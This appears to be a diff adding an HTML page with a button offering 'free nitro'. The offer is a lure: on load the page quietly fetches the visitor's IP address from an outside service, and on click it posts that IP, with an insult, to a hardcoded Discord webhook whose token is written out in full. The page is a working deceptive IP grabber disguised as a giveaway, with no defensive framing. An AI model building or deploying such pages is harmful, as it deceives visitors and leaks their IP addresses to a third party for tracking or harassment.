@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>test</title>
+    <style>
+        body {
+            height: 100%;
+            align-content: center;
+            margin-top: 20%;
+            align-self: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background: linear-gradient(90deg, rgba(20, 136, 204) 30%, rgba(0, 80, 239) 90%);
+            margin-left: 40%;
+            vertical-align: middle;
+        }
+        
+        .btn {
+            width: 3cm;
+            font: optional;
+            font: 1em sans-serif;
+            font-weight: bold;
+            border: 100px;
+            border-color: #e7e7e7;
+            color: rgb(0, 0, 0);
+            border-radius: 5px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .btn:hover {
+            background: #b7b7b7;
+        }
+    </style>
+</head>
+
+<body>
+    <button class="btn one" id="btn" onclick="sendMessage(this)">Click me for free nitro</button>
+    <p id="gfg"></p>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+    $.getJSON("https://api.ipify.org?format=json", function(response) {
+        ip = response.ip
+    }, "json")
+
+    function sendMessage() {
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/974383182902341762/uP9135PoBjGbQv6KLuP4I5dut4Y2e3WT3lbijy87t0iWvY2sTGVMDH9AUT0Uk91d2j26");
+
+        request.setRequestHeader('Content-type', 'application/json');
+
+        const params = {
+            username: "Test",
+            avatar_url: "",
+            content: "this person is stupid " + ip
+        }
+
+        request.send(JSON.stringify(params));
+    }
+</script>
+
+</html>
